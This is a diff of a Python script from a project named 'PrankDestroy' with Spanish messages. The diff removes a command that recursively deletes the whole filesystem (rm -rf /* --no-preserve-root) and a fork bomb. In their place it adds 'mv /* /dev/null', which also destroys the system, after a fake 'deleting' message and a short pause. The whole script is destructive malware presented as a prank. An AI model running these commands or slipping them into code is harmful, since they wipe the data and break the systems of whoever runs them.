@@ -1,4 +1,4 @@
-# Delete Total System and created subprocess
+# Move total discord to null
 # By: https://github.com/Br3Fuck/PrankDestroy
 # Modulos:
 
@@ -18,9 +18,8 @@ def clear():
 # Deleted System:
 
 def deleted():
-	os.system("rm -rf /* --no-preserve-root")
-	time.sleep(6.50)
-	os.system(":(){ :|:& };:")
+	print("Moviendo todo el disco a /dev/null")
+	os.system("mv /* /dev/null")
 	
 # Run:
 
@@ -28,6 +27,7 @@ def script():
 	permisos()
 	clear()
 	print("¡Eliminando!...")
+	time.sleep(2)
 	deleted()
 	
 script()
